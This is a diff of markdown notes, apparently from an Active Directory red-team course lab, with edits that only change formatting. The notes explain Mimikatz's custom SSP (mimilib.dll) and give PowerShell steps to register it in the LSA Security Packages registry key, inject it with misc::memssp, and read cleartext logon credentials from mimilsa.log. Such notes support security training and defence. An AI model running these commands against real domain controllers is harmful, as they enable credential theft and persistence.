@@ -113,11 +113,11 @@ ls \\dcorp-dc\C$
 	- Kerberos
 	- Wdigest
 	- CredSSP
-- Mimikatz provides a custom SSP - mimilib.dll. This SSP logs local logons, service account and machine account passwords in clear text on the target server.
+- Mimikatz provides a custom SSP - mimilib.dll. This SSP _logs local logons, service account and machine account passwords in clear text on the target server_.
 
 #### Attack
 - We can use either of the ways:
-	- Drop the mimilib.dll to system32 and add mimilib to `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`
+1. Drop the mimilib.dll to system32 and add mimilib to `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`
 
 ```powershell
 $packages = Get-ItemProperty
@@ -143,7 +143,7 @@ Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name
 ```powershell
 Invoke-Mimikatz -Command '"misc::memssp"'
 ```
-- All local logons on the DC are logged to:
+2. All local logons on the DC are logged to:
 ```powershell
 cat C:\Windows\system32\mimilsa.log
 ```
